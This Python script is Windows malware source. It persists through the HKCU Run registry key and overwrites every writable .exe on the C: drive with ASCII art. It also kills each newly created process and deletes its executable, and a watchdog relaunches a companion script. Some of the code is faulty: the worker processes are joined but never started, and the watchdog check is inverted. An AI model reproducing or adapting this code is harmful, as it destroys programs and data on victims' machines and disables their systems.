import psutil
import os
import winreg
import multiprocessing
from subprocess import call
from wmi import WMI
from os import path
from os import walk
from os.path import splitext

# Get a file path through its process ID
def get_process_path(process_name):
    for pid in psutil.pids():
        try:
            if psutil.Process(pid).name() == process_name:
                return psutil.Process(pid).exe()
        except:
            return None

# Running file watcher
call(["Lonely-12-cpp"])

# Adding watcher file to startup
try:
    pth = os.path.dirname(os.path.realpath(__file__))
    file = "Unusable-2.pyw"
    address = path.join(pth, file)

    # Getting path
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"

    # Adding and closing key
    opn = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(opn, "any_name", 0, winreg.REG_SZ, address)
    winreg.CloseKey(opn)

except:
    pass

# Scanning entire C drive
def scan_cdrive():
    for root, dirs, files in walk("C:\\"):
        # Iterating through files
        for file in files:
            # Grabbing files
            fpath  = root + "\\" + file
            ext = splitext(root + "\\" + file)[1]

            # Checking if extension is .exe
            if ext == ".exe":
                # Checking the file doesn't require administrator privileges
                try:
                    with open(fpath, "w") as ff:
                        ff.write("""                    
                                                                 __,-~~/~    `---.
                                                               _/_,---(      ,    )
                                                           __ /        <    /   )  \___
                                            - ------===;;;'====------------------===;;;===----- -  -
                                                              \/  ~"~"~"~"~"~\~"~)~"/
                                                              (_ (   \  (     >    \)
                                                               \_( _ <         >_>'
                                                                  ~ `-i' ::>|--"
                                                                      I;|.|.|
                                                                     <|i::|i|`.
                                                                    (` ^'"`-' ")
                                """)
                except:
                    pass

# Creating process watcher
def watch_process():
    w = WMI()
    watcher = w.Win32_Process.watch_for("creation")

    while True:
        # Getting process path and name
        process = watcher().Caption
        process_path = get_process_path(process) if get_process_path(process) is not None else ""

        # Killing process and deleting file
        for p in psutil.process_iter():
            if p.name() == process:
                try:
                    p.kill()
                    os.remove(process_path)
                except:
                    pass

# Checking if file watcher isn't closed
def check_file():
    while True:
        closed = "Lonely-12.cpp" in (p.name() for p in psutil.process_iter())

        if closed:
            call(["Eradication-Typhoon.pyw"])

# Executing the 3 processes
scan = multiprocessing.Process(target = scan_cdrive)
watch = multiprocessing.Process(target = watch_process)
check = multiprocessing.Process(target = check_file)

scan.join()
watch.join()
check.join()